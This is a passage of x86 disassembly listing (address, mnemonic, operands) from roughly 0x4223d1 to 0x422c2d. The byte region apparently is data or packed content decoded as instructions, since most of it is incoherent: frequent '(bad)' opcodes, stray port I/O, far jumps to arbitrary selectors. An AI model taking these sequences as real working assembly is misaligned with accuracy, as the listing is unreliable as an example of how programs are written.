  4223d1:	add    eax,0x8e13a826
  4223d6:	cdq    
  4223d7:	cwde   
  4223d8:	pop    ss
  4223d9:	pop    edi
  4223da:	adc    dl,BYTE PTR [eax+0x65bde8a8]
  4223e0:	xor    DWORD PTR [ebx+0x77],ebx
  4223e3:	pop    esi
  4223e4:	mov    ds:0xf6e92eaf,eax
  4223e9:	test   BYTE PTR [esi],bl
  4223eb:	fisubr DWORD PTR [ebx-0x7fba64bc]
  4223f1:	mov    eax,0x5f9a6552
  4223f6:	xor    cl,ch
  4223f8:	mov    WORD PTR [ecx-0x68],cs
  4223fb:	sar    BYTE PTR [edi+0x79fa1619],0xf7
  422402:	mov    ds:0xbcb92f41,al
  422407:	dec    edi
  422408:	outs   dx,BYTE PTR ds:[esi]
  422409:	sub    bl,ch
  42240b:	cmp    DWORD PTR [edx-0x2],esp
  42240e:	daa    
  42240f:	sbb    ah,bh
  422411:	pop    ds
  422412:	fadd   DWORD PTR [edx+0x39c15679]
  422418:	in     eax,0xf8
  42241a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42241b:	(bad)  
  42241c:	in     al,dx
  42241d:	add    esi,0xffffffd7
  422420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422421:	adc    al,BYTE PTR [ecx+0x6d995ddb]
  422427:	(bad)  
  422428:	loop   0x42248f
  42242a:	into   
  42242b:	mov    esi,0x8fcc6fbf
  422430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422431:	dec    ebx
  422432:	push   edi
  422433:	out    0x2e,eax
  422435:	(bad)  [edi+0x1a]
  422438:	mov    ch,0xe1
  42243a:	adc    BYTE PTR [ecx+0x1e2698c8],bh
  422440:	inc    ecx
  422441:	test   al,0xd8
  422443:	int    0x6a
  422445:	mov    ds:0x68398f7,al
  42244a:	push   ebx
  42244b:	in     al,0x79
  42244d:	or     BYTE PTR [eax+0x772def4],dh
  422453:	pop    es
  422454:	fidivr WORD PTR [esp+ebp*1-0x78]
  422458:	mov    ecx,0x42320e67
  42245d:	fwait
  42245e:	sub    ebp,DWORD PTR [ebx+0x3f]
  422461:	cs add al,0xf
  422464:	(bad)  
  422466:	cmp    eax,0xda5ae7bd
  42246b:	sub    edx,DWORD PTR [ecx-0x51]
  42246e:	or     al,0x56
  422470:	retf   
  422471:	lahf   
  422472:	mov    al,es:0x669542c4
  422478:	sub    DWORD PTR [edx-0x17],ebp
  42247b:	cli    
  42247c:	sti    
  42247d:	sub    ch,al
  42247f:	pop    ds
  422480:	retf   0xc279
  422483:	dec    edi
  422484:	pop    ss
  422485:	dec    eax
  422486:	adc    al,0xd5
  422488:	mov    ah,BYTE PTR [ebp-0x63525a2c]
  42248e:	sub    edi,DWORD PTR es:[edx+0x6aaf379b]
	...
  422511:	add    BYTE PTR [eax],al
  422513:	add    bh,al
  422515:	stc    
  422516:	out    0xe3,eax
  422518:	(bad)  
  422519:	inc    edi
  42251b:	std    
  42251c:	fidivr WORD PTR [ebx]
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	dec    esp
  422520:	and    edi,eax
  422522:	or     al,dh
  422524:	(bad)  
  422525:	mov    edx,0x7690001
  42252a:	add    BYTE PTR [eax],al
  42252c:	js     0x4225a6
  42252e:	(bad)  
  422530:	repz (bad) 
  422532:	xor    al,0x39
  422534:	or     eax,0x8feb8ec
  422539:	shr    DWORD PTR [edx],1
  42253b:	cld    
  42253c:	mov    dh,0xd2
  42253e:	enter  0xc3b3,0x68
  422542:	hlt    
  422543:	jno    0x4224c7
  422545:	retf   0x890f
  422548:	rcr    BYTE PTR ds:[ebp+0x4b0bc619],0x86
  422550:	adc    DWORD PTR [ebp-0x5e14adf4],ebp
  422556:	inc    eax
  422557:	dec    ecx
  422558:	dec    ecx
  422559:	test   DWORD PTR [esi],ecx
  42255b:	mov    esp,0x92cc50e0
  422560:	adc    esi,DWORD PTR [ecx-0x7db1fbc8]
  422566:	repz fcomi st,st(1)
  422569:	sti    
  42256a:	jp     0x422511
  42256c:	mov    al,0x3a
  42256e:	loopne 0x422559
  422570:	(bad)  
  422571:	mov    ch,0xe6
  422573:	xor    edi,DWORD PTR [esi]
  422575:	cmc    
  422576:	int    0x88
  422578:	adc    eax,0x9faa3b10
  42257d:	dec    edi
  42257e:	and    al,0x40
  422580:	add    al,0x28
  422582:	scas   al,BYTE PTR es:[edi]
  422583:	jno    0x422548
  422585:	fxsave [edx]
  422588:	test   BYTE PTR [esi+0x12],bl
  42258b:	add    eax,0x828a1128
  422590:	sub    edi,esp
  422592:	mov    al,0xb1
  422594:	cmova  edx,DWORD PTR [ecx-0x2a]
  422598:	mov    ds:0xa4648192,al
  42259d:	jnp    0x4225e3
  42259f:	and    edx,eax
  4225a1:	and    al,0x3f
  4225a3:	mov    edx,0x6cfb05d4
  4225a8:	call   0x419ea32f
  4225ad:	in     eax,dx
  4225ae:	mov    ebp,0x8faab085
  4225b3:	sbb    al,0x2e
  4225b5:	(bad)  
  4225b6:	mov    ebx,0xe8e1a91e
  4225bb:	and    al,0x98
  4225bd:	sbb    DWORD PTR [ecx+0x223bb8f],edi
  4225c3:	jge    0x422600
  4225c5:	inc    edi
  4225c6:	into   
  4225c7:	int3   
  4225c8:	test   dh,ch
  4225ca:	fistp  WORD PTR [ecx-0x51]
  4225cd:	jmp    0x4225e8
  4225cf:	fmulp  st(6),st
  4225d1:	jmp    0x4225b3
  4225d3:	(bad)  
  4225d4:	push   edi
  4225d5:	(bad)  
  4225d6:	push   edx
  4225d7:	js     0x42263f
  4225d9:	mov    DWORD PTR [esi],ecx
  4225db:	das    
  4225dc:	or     edi,DWORD PTR ds:0x2e05f9dc
  4225e2:	(bad)  
  4225e3:	jmp    0x4225d6
  4225e5:	fcom   DWORD PTR [ebp-0x58ad7119]
  4225eb:	js     0x42264a
  4225ed:	xor    BYTE PTR [esi+0x35],ch
  4225f0:	mov    DWORD PTR [edx-0x17],0x6d65d92
  4225f7:	jnp    0x42259c
  4225f9:	adc    al,0xa6
  4225fb:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4225fd:	fwait
  4225fe:	inc    edx
  4225ff:	in     al,dx
  422600:	and    BYTE PTR [eax],al
  422602:	mov    eax,0xd6a1c54f
  422607:	xchg   ebp,eax
  422608:	enter  0xb0de,0xf7
  42260c:	add    eax,0x81db62bf
  422611:	add    eax,0x4838137f
  422616:	xor    DWORD PTR cs:[esi-0x3b7a0ec1],esp
  42261d:	mov    bh,0x48
  42261f:	push   0x40
  422621:	or     bl,ch
  422623:	jecxz  0x4225e3
  422625:	jns    0x4225b6
  422627:	dec    ecx
  422628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422629:	mov    DWORD PTR [edi-0x8],eax
  42262c:	fadd   st(4),st
  42262e:	and    al,0xa0
  422630:	test   eax,0x1152bdd
  422635:	cdq    
  422636:	cmp    BYTE PTR [edx-0xbd0f680],al
  42263c:	pop    edi
  42263d:	push   edi
  42263e:	inc    esp
  42263f:	adc    esi,eax
  422641:	retf   0x1b56
  422644:	xor    al,0x3b
  422646:	mul    BYTE PTR [edx+0x4c]
  422649:	add    eax,DWORD PTR [ebp-0x61]
  42264c:	in     al,0x90
  42264e:	sub    bl,BYTE PTR [eax+edi*1+0x6179aae1]
  422655:	dec    edx
  422656:	mov    esp,0x1a57e7ea
  42265b:	dec    ecx
  42265c:	pop    ecx
  42265d:	retf   
  42265e:	fcmovu st,st(1)
  422660:	adc    ch,cl
  422662:	in     eax,dx
  422663:	out    dx,eax
  422664:	xchg   edi,eax
  422665:	std    
  422666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422667:	fidiv  WORD PTR [edi+0x544cc4c6]
  42266d:	into   
  42266e:	pop    esi
  42266f:	cld    
  422670:	and    ch,BYTE PTR [eax]
  422672:	lahf   
  422673:	cmp    eax,0x23c881b5
  422678:	mov    eax,ds:0xf0e78f5f
  42267d:	loope  0x42264b
  42267f:	xor    eax,0xced6cbbc
  422684:	(bad)  
  422685:	mov    ebp,0x90b0bd57
  42268a:	push   ebp
  42268b:	add    edx,DWORD PTR [ecx+0x4dcaa4bb]
  422691:	bound  edx,QWORD PTR [ecx]
  422693:	jmp    0x2501:0xcbd736d0
  42269a:	popf   
  42269b:	ins    BYTE PTR es:[di],dx
  42269d:	xchg   edi,eax
  42269e:	xor    eax,0xb8c9cf08
  4226a3:	ret    0x74fb
  4226a6:	pop    ecx
  4226a7:	mov    al,ds:0x4e42be1d
  4226ac:	cmp    eax,0x16e791f2
  4226b1:	inc    edx
  4226b2:	push   ds
  4226b3:	dec    edx
  4226b4:	in     eax,0xf0
  4226b6:	xchg   esp,eax
  4226b7:	jmp    FWORD PTR [ebp+edx*8-0x5ddf46dc]
  4226be:	imul   ecx,DWORD PTR ds:0x59dde046,0xe0425630
  4226c8:	dec    esi
  4226c9:	call   0xf859:0xf2bd9c98
  4226d0:	mov    al,ds:0xb29f3778
  4226d5:	outs   dx,BYTE PTR ds:[esi]
  4226d6:	mov    WORD PTR [eax-0x69b69a51],es
  4226dc:	popf   
  4226dd:	cmp    eax,0xd3db7552
  4226e2:	pushf  
  4226e3:	cmp    ecx,0x323763ef
  4226e9:	mov    edx,0x96e868fa
  4226ee:	push   ecx
  4226ef:	fdiv   DWORD PTR [ebx-0x2bcdc88c]
  4226f5:	test   BYTE PTR [ebp+0x6eb1dc1f],0xa
  4226fc:	xchg   ecx,eax
  4226fd:	or     al,0x4a
  4226ff:	repnz daa 
  422701:	or     BYTE PTR [ebx],ch
  422703:	cli    
  422704:	or     al,0x8b
  422706:	leave  
  422707:	loop   0x422736
  422709:	std    
  42270a:	mov    ah,0x2e
  42270c:	or     ah,BYTE PTR [ebx+0x71]
  42270f:	(bad)  
  422710:	xchg   esi,eax
  422711:	fcomp  QWORD PTR [eax+0x9]
  422714:	xor    edx,DWORD PTR [edx]
  422716:	call   0xb446:0x876b43ed
  42271d:	sbb    al,0xb1
  42271f:	outs   dx,DWORD PTR ds:[esi]
  422720:	popa   
  422721:	cmp    eax,0xc95bd41e
  422726:	adc    ah,BYTE PTR ds:0x343ec7a5
  42272c:	je     0x42274b
  42272e:	jb     0x4226dc
  422730:	nop
  422731:	mov    eax,0x27b72b7f
  422736:	jg     0x42279a
  422738:	xlat   BYTE PTR ds:[ebx]
  422739:	out    0x9c,al
  42273b:	pusha  
  42273c:	mov    esi,0x49967077
  422741:	fstp   TBYTE PTR [ebx-0x30]
  422744:	int    0x8d
  422746:	stos   DWORD PTR es:[edi],eax
  422747:	ret    0x736f
  42274a:	inc    esp
  42274b:	ja     0x422798
  42274d:	dec    edx
  42274e:	adc    DWORD PTR [ebp+0x41],esi
  422751:	xchg   ch,ch
  422753:	(bad)  
  422755:	int3   
  422756:	out    dx,eax
  422757:	inc    ebp
  422758:	fstp   TBYTE PTR [edi-0x24]
  42275b:	dec    eax
  42275c:	sbb    edx,ebp
  42275e:	fdiv   DWORD PTR [eax]
  422760:	add    ebx,DWORD PTR [edx]
  422762:	xlat   BYTE PTR ds:[ebx]
  422763:	fsubr  st,st(7)
  422765:	leave  
  422766:	test   dl,0xc2
  422769:	loop   0x4226f2
  42276b:	and    al,BYTE PTR [ebp-0x5a]
  42276e:	sbb    ebp,DWORD PTR [ecx]
  422770:	mov    esp,0x8d56026c
  422775:	js     0x4227a1
  422777:	in     al,0x2c
  422779:	adc    eax,0xaf50057f
  42277e:	outs   dx,DWORD PTR ds:[esi]
  42277f:	ins    DWORD PTR es:[edi],dx
  422780:	and    WORD PTR ds:0x449fc231,dx
  422787:	scas   eax,DWORD PTR es:[edi]
  422788:	je     0x422753
  42278a:	hlt    
  42278b:	cmp    dh,cl
  42278d:	scas   al,BYTE PTR es:[edi]
  42278e:	dec    ebx
  42278f:	popa   
  422790:	pop    ds
  422791:	xchg   edi,eax
  422792:	out    dx,al
  422793:	imul   ecx,eax,0x18
  422796:	mov    BYTE PTR [edx+0x16],cl
  422799:	push   edx
  42279a:	inc    ebx
  42279b:	xchg   esp,eax
  42279c:	sbb    al,0x26
  42279e:	xor    DWORD PTR [eax],edx
  4227a0:	inc    edx
  4227a1:	cs pop ds
  4227a3:	push   es
  4227a4:	push   esi
  4227a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a6:	dec    eax
  4227a7:	dec    esp
  4227a8:	or     esi,DWORD PTR [ebx-0x3d624e27]
  4227ae:	pop    ebp
  4227af:	cmp    DWORD PTR [ebx+0x24],esi
  4227b2:	js     0x42278d
  4227b4:	lea    edi,[esi+0x2f]
  4227b7:	and    ecx,edx
  4227b9:	inc    edi
  4227ba:	ret    
  4227bb:	xor    al,0x56
  4227bd:	sbb    BYTE PTR [edx-0x1e],0x52
  4227c1:	sbb    edi,DWORD PTR [esi+0x5e97a052]
  4227c7:	rcr    BYTE PTR [ebp-0x3a],0x87
  4227cb:	push   ecx
  4227cc:	jmp    0x4227c9
  4227ce:	mov    esp,0xd9c64325
  4227d3:	sub    al,BYTE PTR [ecx-0x65]
  4227d6:	rcl    BYTE PTR [edx+0x4432ccb7],0xee
  4227dd:	ins    DWORD PTR es:[edi],dx
  4227de:	pop    ebx
  4227df:	daa    
  4227e0:	inc    ecx
  4227e1:	sbb    eax,0x3867abf8
  4227e6:	fiadd  WORD PTR [esi-0x57e93c14]
  4227ec:	sub    eax,0x34e3e815
  4227f1:	adc    BYTE PTR [ebp+0x6e],dh
  4227f4:	adc    al,0xa2
  4227f6:	dec    edx
  4227f7:	(bad)  
  4227f9:	aad    0xdd
  4227fb:	xor    eax,0xe7db0a05
  422800:	jns    0x4227e0
  422802:	pop    ebx
  422803:	mov    WORD PTR [esi+0x4f98c8d5],gs
  422809:	(bad)  
  42280a:	shl    BYTE PTR [edx],1
  42280c:	scas   al,BYTE PTR es:[edi]
  42280d:	jmp    0x1d6abc75
  422812:	push   esp
  422813:	(bad)  
  422815:	js     0x422830
  422817:	xchg   ecx,eax
  422818:	sbb    BYTE PTR [esi-0x6a],0x67
  42281c:	in     eax,0x20
  42281e:	adc    al,0x38
  422820:	xchg   ecx,eax
  422821:	lds    eax,FWORD PTR [edi+0x1d8a3af1]
  422827:	xor    bh,BYTE PTR [ebp-0x71]
  42282a:	lds    edx,FWORD PTR ds:0x3c4137ff
  422830:	xchg   ebx,eax
  422831:	fwait
  422832:	popa   
  422833:	fwait
  422834:	(bad)  
  422835:	or     al,0x12
  422837:	inc    ebx
  422838:	and    cl,BYTE PTR [esi+eiz*4]
  42283b:	push   ecx
  42283c:	add    eax,esi
  42283e:	jp     0x422854
  422840:	inc    esi
  422841:	(bad)  
  422842:	push   edi
  422843:	xor    DWORD PTR [ebx],edi
  422845:	dec    esp
  422846:	adc    eax,0xd4ec911a
  42284b:	push   es
  42284c:	imul   edi,DWORD PTR [ebp+0x58],0xd1de46c6
  422853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422854:	(bad)  
  422855:	mov    edi,0x18de6221
  42285a:	xor    BYTE PTR [ebp+0x77],0x1
  42285e:	inc    edx
  42285f:	mov    edi,0xd3e61799
  422864:	sbb    DWORD PTR [edx],edx
  422866:	xchg   esi,eax
  422867:	jp     0x42281c
  422869:	into   
  42286a:	mov    ds:0xf31b348,al
  42286f:	scas   eax,DWORD PTR es:[edi]
  422870:	mov    ds:0x6c03bf03,eax
  422875:	aaa    
  422876:	dec    edi
  422877:	pop    edx
  422878:	int3   
  422879:	cld    
  42287a:	add    esi,0xfffffffd
  42287d:	dec    ebp
  42287e:	les    esp,FWORD PTR [eax-0x549f343]
  422884:	out    0x1c,eax
  422886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422887:	add    DWORD PTR [edi-0x3252d0f9],eax
  42288d:	mov    eax,0x290413b3
  422892:	add    dh,bl
  422894:	test   eax,0x5a04f96a
  422899:	sub    ebx,DWORD PTR [edi-0x19c40819]
  42289f:	fstp   st(4)
  4228a1:	rcr    BYTE PTR [esi+0x9],1
  4228a4:	stc    
  4228a5:	stos   BYTE PTR es:[edi],al
  4228a6:	sub    edx,ebp
  4228a8:	mov    esp,0x5bfd9a88
  4228ad:	aam    0xe7
  4228af:	cmp    BYTE PTR [esi+0x52eaab60],al
  4228b5:	xor    edx,esp
  4228b7:	cdq    
  4228b8:	jmp    FWORD PTR [esi]
  4228ba:	ficomp DWORD PTR [bx+si]
  4228bd:	in     eax,0x71
  4228bf:	das    
  4228c0:	out    0x4f,eax
  4228c2:	pop    esp
  4228c3:	push   esp
  4228c4:	mov    eax,0xf4906f5d
  4228c9:	add    eax,0x852593cb
  4228ce:	jnp    0x422869
  4228d0:	mov    ebp,0xce1d602f
  4228d5:	stos   BYTE PTR es:[edi],al
  4228d6:	ficomp WORD PTR [edx]
  4228d8:	and    bh,ah
  4228da:	xchg   edi,eax
  4228db:	push   DWORD PTR [edi]
  4228dd:	xchg   BYTE PTR [esi-0x1f],bh
  4228e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228e1:	ds add al,0x81
  4228e4:	inc    eax
  4228e5:	mov    bh,0xe5
  4228e7:	popf   
  4228e8:	jno    0x422913
  4228ea:	inc    eax
  4228eb:	inc    ebp
  4228ec:	sbb    ecx,DWORD PTR [eax+0x8603628]
  4228f2:	cmp    edx,DWORD PTR [esi+esi*2+0x52fdba0b]
  4228f9:	add    ebx,esi
  4228fb:	sbb    bl,al
  4228fd:	(bad)  
  4228fe:	(bad)  
  4228ff:	arpl   WORD PTR [edx*1+0x738ccb4e],bx
  422906:	ss mov ebx,0x87d6bfe8
  42290c:	inc    ebx
  42290d:	sub    BYTE PTR [ecx-0x16399ca0],cl
  422913:	out    0xb9,eax
  422915:	div    ch
  422917:	imul   esp,DWORD PTR [edi+ecx*8+0x68a38e8f],0xf635bd3d
  422922:	imul   ebx,DWORD PTR [edx+0x5c695d4c],0xffffffa4
  422929:	push   esp
  42292a:	imul   ebx,DWORD PTR [ecx-0x363bf88b],0x3895869c
  422934:	adc    ecx,ebp
  422936:	arpl   WORD PTR [ebx-0x64],ax
  422939:	dec    ebp
  42293a:	ja     0x422956
  42293c:	mov    DWORD PTR [ecx+esi*1-0x4a],ebx
  422940:	add    edi,DWORD PTR [edx-0x2b5cf56]
  422946:	fadd   DWORD PTR [ecx+edx*4+0x20e7b6]
  42294d:	cmp    DWORD PTR es:[edi-0x7755c6dc],0xfffffffb
  422955:	sub    al,0x71
  422957:	and    al,0xfd
  422959:	jb     0x42298e
  42295b:	mov    al,0xcc
  42295d:	(bad)  
  42295e:	pop    ecx
  42295f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422960:	jae    0x4228e3
  422962:	cdq    
  422963:	out    dx,eax
  422964:	in     al,0x97
  422966:	jnp    0x422985
  422968:	or     ecx,DWORD PTR [ebx]
  42296a:	fs inc ebp
  42296c:	sbb    dl,dl
  42296e:	jmp    0x4ff0:0xb172df71
  422975:	add    esp,DWORD PTR [edx-0x56]
  422978:	jnp    0x42299a
  42297a:	push   esp
  42297b:	mov    al,0x62
  42297d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42297e:	adc    ah,bl
  422980:	mov    ebx,0x2ed48eda
  422985:	pop    ss
  422986:	push   ecx
  422987:	or     BYTE PTR [edx],dl
  422989:	jo     0x422914
  42298b:	outs   dx,DWORD PTR ds:[esi]
  42298c:	ja     0x422972
  42298e:	test   BYTE PTR [esi-0x44809401],ch
  422994:	or     eax,0xe864b869
  422999:	xor    bl,BYTE PTR [edx]
  42299b:	pushf  
  42299c:	lock and bl,BYTE PTR ds:0x29376ebd
  4229a3:	pop    ss
  4229a4:	fucom  st(5)
  4229a6:	jmp    0xe807:0x857f226d
  4229ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229ae:	(bad)  
  4229af:	cld    
  4229b0:	sbb    ch,ah
  4229b2:	cs jnp 0x4229d9
  4229b5:	xchg   esi,eax
  4229b6:	leave  
  4229b7:	pop    edi
  4229b8:	out    dx,al
  4229b9:	dec    eax
  4229ba:	jle    0x422994
  4229bc:	loop   0x422951
  4229be:	adc    esp,eax
  4229c0:	mov    al,0xaf
  4229c2:	(bad)  
  4229c3:	push   ecx
  4229c4:	andps  xmm4,xmm3
  4229c7:	inc    ebx
  4229c8:	arpl   WORD PTR ds:0x469840f7,si
  4229ce:	sub    edx,DWORD PTR [edx-0x29]
  4229d1:	jae    0xa431c1ef
  4229d7:	dec    esp
  4229d8:	xchg   BYTE PTR [edx+ecx*1+0x23],ah
  4229dc:	and    edx,edx
  4229de:	sbb    edx,DWORD PTR [eax-0x3d764197]
  4229e4:	call   0x1a9:0x980b9661
  4229eb:	pop    ss
  4229ec:	dec    edx
  4229ed:	(bad)  
  4229ee:	xor    al,0xc
  4229f0:	in     al,0x1a
  4229f2:	jl     0x422a19
  4229f4:	aad    0xa7
  4229f6:	lahf   
  4229f7:	imul   ebx,DWORD PTR [edi+ecx*8-0x5711ccf2],0xa253d68b
  422a02:	sbb    esp,DWORD PTR [ecx*4+0x171ac57c]
  422a09:	xor    DWORD PTR [esi+0x7],edi
  422a0c:	push   ecx
  422a0d:	aam    0x1d
  422a0f:	push   ecx
  422a10:	and    al,0xbc
  422a12:	mov    al,ds:0xe81c2ebe
  422a17:	pop    ecx
  422a18:	push   ds
  422a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a1a:	sti    
  422a1b:	push   ecx
  422a1c:	(bad)  
  422a1d:	pop    ebp
  422a1e:	mul    DWORD PTR [edx+0x1ceeea71]
  422a24:	and    ecx,DWORD PTR [eax+0x54]
  422a27:	repz das 
  422a29:	sub    BYTE PTR [ecx-0x3b783e50],ch
  422a2f:	push   ebp
  422a30:	repz inc esi
  422a32:	jnp    0x422a86
  422a34:	fldcw  WORD PTR [eax]
  422a36:	outs   dx,DWORD PTR ds:[esi]
  422a37:	fdiv   DWORD PTR [ebx*1-0x67320caa]
  422a3e:	cli    
  422a3f:	xchg   BYTE PTR [ebx],bh
  422a41:	jg     0x422a5d
  422a43:	lock ror bl,1
  422a46:	add    eax,0x560c52cd
  422a4b:	and    al,0x72
  422a4d:	repz jno 0x422a9e
  422a50:	int    0xa7
  422a52:	jb     0x422a47
  422a54:	add    bh,BYTE PTR [ebx-0x6a2f5d9e]
  422a5a:	cmp    al,BYTE PTR [ecx+0x4895a8f9]
  422a60:	sub    BYTE PTR [ebp+0x5584dc54],bh
  422a66:	push   0xdea78c2c
  422a6b:	jl     0x422a24
  422a6d:	shl    bh,0xdf
  422a70:	rcr    BYTE PTR [esi-0x5f],1
  422a73:	inc    esi
  422a74:	out    dx,al
  422a75:	fmul   DWORD PTR [ebx+0x59]
  422a78:	push   ebx
  422a79:	lods   al,BYTE PTR ds:[esi]
  422a7a:	mov    al,0xe5
  422a7c:	ror    BYTE PTR [ebp+0x2bf3b09f],1
  422a82:	push   0xffffffae
  422a84:	xchg   edx,eax
  422a85:	pushf  
  422a86:	mov    ah,0xe5
  422a88:	dec    ebx
  422a89:	sub    al,0x61
  422a8b:	(bad)  [eax]
  422a8d:	lods   al,BYTE PTR ds:[esi]
  422a8e:	push   edi
  422a8f:	jnp    0x422aa3
  422a91:	(bad)  
  422a92:	mov    ds:0xb5b386c4,eax
  422a97:	add    DWORD PTR [eax-0x69ad3cd9],edi
  422a9d:	cmp    BYTE PTR [ebx+0x58f4b67a],ch
  422aa3:	add    DWORD PTR [edx],ebx
  422aa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aa6:	mov    ds:0x406d01f0,al
  422aab:	or     eax,0xc7f61a4c
  422ab0:	sub    DWORD PTR [esi-0x7b],ebp
  422ab3:	xor    DWORD PTR [esp+edx*4],eax
  422ab6:	nop
  422ab7:	pop    ecx
  422ab8:	loopne 0x422ac6
  422aba:	pop    edx
  422abb:	int    0x6
  422abd:	pop    esp
  422abe:	fiadd  WORD PTR [ecx+0x16]
  422ac1:	(bad)  [esi]
  422ac3:	add    al,0xea
  422ac5:	push   ebx
  422ac6:	cmp    BYTE PTR [ecx+0x45],0x20
  422aca:	neg    cl
  422acc:	cdq    
  422acd:	inc    ebp
  422ace:	dec    ebp
  422acf:	dec    edi
  422ad0:	(bad)
  422ad4:	bound  edx,QWORD PTR [edx]
  422ad6:	jns    0x422b3a
  422ad8:	xor    BYTE PTR [edi],bh
  422ada:	mov    ah,0xd0
  422adc:	(bad)  
  422add:	sub    edi,DWORD PTR ds:0x50d290ea
  422ae3:	(bad)  
  422ae4:	pop    esi
  422ae5:	sahf   
  422ae6:	inc    edi
  422ae7:	enter  0xd994,0xbc
  422aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aec:	loop   0x422b34
  422aee:	and    al,0x67
  422af0:	xchg   DWORD PTR [edx-0x53],esi
  422af3:	(bad)  
  422af4:	(bad)  
  422af5:	std    
  422af6:	mov    bl,0x7b
  422af8:	into   
  422af9:	xor    ebp,DWORD PTR [esi-0xd]
  422afc:	mov    ch,0x78
  422afe:	mov    ss,WORD PTR [edx]
  422b00:	sub    DWORD PTR gs:[edi],eax
  422b03:	test   al,0xef
  422b05:	ins    DWORD PTR es:[edi],dx
  422b06:	adc    dl,BYTE PTR [eax]
  422b08:	outs   dx,DWORD PTR ds:[esi]
  422b09:	pop    edi
  422b0a:	lods   al,BYTE PTR ds:[esi]
  422b0b:	xor    eax,0xb38f89b
  422b10:	imul   ebp,DWORD PTR [eax+0x63],0x2d0ece63
  422b17:	and    ch,0x96
  422b1a:	test   eax,0xa0bdbce3
  422b1f:	pusha  
  422b20:	fstp   DWORD PTR [ecx]
  422b22:	cmp    edx,ecx
  422b24:	fxch   st(7)
  422b26:	mov    BYTE PTR [esi+0x2dcca5e9],ch
  422b2c:	pop    ecx
  422b2d:	imul   esi,ebp,0x25
  422b30:	sbb    BYTE PTR [ecx-0x290642aa],0xf3
  422b37:	mov    esi,esi
  422b39:	dec    ebp
  422b3a:	jo     0x422b2c
  422b3c:	jge    0x422b5e
  422b3e:	(bad)  
  422b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b40:	shr    BYTE PTR [eax],cl
  422b42:	cmp    esp,DWORD PTR [ebx]
  422b44:	or     BYTE PTR [ebx+0x7f],bl
  422b47:	mov    edx,0xc01f5ae9
  422b4c:	jmp    0xffc8:0x6ba50e03
  422b53:	fidivr WORD PTR [edx]
  422b55:	inc    edi
  422b56:	jne    0x422b02
  422b58:	int    0xa3
  422b5a:	pop    es
  422b5b:	test   DWORD PTR [ecx-0x37],ecx
  422b5e:	xchg   ebp,eax
  422b5f:	xchg   edx,eax
  422b60:	cmp    eax,0xb7902849
  422b65:	and    al,0xfe
  422b67:	inc    edi
  422b68:	xlat   BYTE PTR ds:[ebx]
  422b69:	push   ss
  422b6a:	mov    ds,ebx
  422b6c:	fwait
  422b6d:	and    DWORD PTR [edx+0x755d0e69],edx
  422b73:	sbb    al,dh
  422b75:	mov    esp,0x4e0a0e7c
  422b7a:	sbb    al,0x89
  422b7c:	mov    DWORD PTR [ecx-0x1d50bf65],edi
  422b82:	or     BYTE PTR [esi-0x71],cl
  422b85:	and    esp,DWORD PTR [ebp+0x38151ccf]
  422b8b:	xchg   ecx,eax
  422b8c:	shr    DWORD PTR [edx],cl
  422b8e:	xor    eax,0xf3ccb7fa
  422b93:	push   ebx
  422b94:	pop    ecx
  422b95:	int3   
  422b96:	or     dl,BYTE PTR [eax+0x31]
  422b99:	jbe    0x422b22
  422b9b:	inc    esp
  422b9c:	or     eax,0x86b839c1
  422ba1:	ja     0x422b4c
  422ba3:	(bad)  
  422ba4:	ficomp DWORD PTR [ebx-0x543ee6a9]
  422baa:	not    edx
  422bac:	das    
  422bad:	inc    esi
  422bae:	into   
  422baf:	inc    edi
  422bb0:	fbstp  TBYTE PTR [edx-0xdfbe6e9]
  422bb6:	sbb    bl,BYTE PTR [edi-0x36c04283]
  422bbc:	xchg   ebp,eax
  422bbd:	dec    ebx
  422bbe:	push   esi
  422bbf:	dec    ebx
  422bc0:	adc    DWORD PTR [eax+eax*4],ebp
  422bc3:	push   edi
  422bc4:	icebp  
  422bc5:	call   0x4ee1b856
  422bca:	dec    eax
  422bcb:	icebp  
  422bcc:	pushf  
  422bcd:	retf   
  422bce:	stos   BYTE PTR es:[edi],al
  422bcf:	(bad)  
  422bd0:	push   ecx
  422bd1:	jns    0x422c2a
  422bd3:	mov    ds:0xa90510fa,eax
  422bd8:	jmp    0x422bdd
  422bda:	ja     0x422ba2
  422bdc:	mul    BYTE PTR [edx-0x427b8c57]
  422be2:	xchg   BYTE PTR [eax-0x18],bl
  422be5:	add    edx,ebp
  422be7:	adc    ah,al
  422be9:	ds and al,0x6b
  422bec:	sahf   
  422bed:	mov    ebx,0xe5f81826
  422bf2:	mov    al,0x6d
  422bf4:	fdiv   DWORD PTR [ecx-0x27b9f83a]
  422bfa:	mov    al,ds:0x2a882a8
  422bff:	fabs   
  422c01:	push   ebx
  422c02:	scas   eax,DWORD PTR es:[edi]
  422c03:	mov    esi,0xacb7cf01
  422c08:	or     eax,0x37ef5ddd
  422c0d:	daa    
  422c0e:	shl    DWORD PTR [esi+ecx*2],cl
  422c11:	(bad)  
  422c12:	loope  0x422c78
  422c14:	nop
  422c15:	jno    0x422c09
  422c17:	dec    edi
  422c18:	mov    ds,WORD PTR [eax+0x231259d1]
  422c1e:	(bad)  
  422c1f:	sbb    al,0x28
  422c21:	out    0x49,eax
  422c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c24:	cld    
  422c25:	rol    ecx,1
  422c27:	mov    edi,0x4f09d3cd
  422c2c:	dec    esp
  422c2d:	cwde   
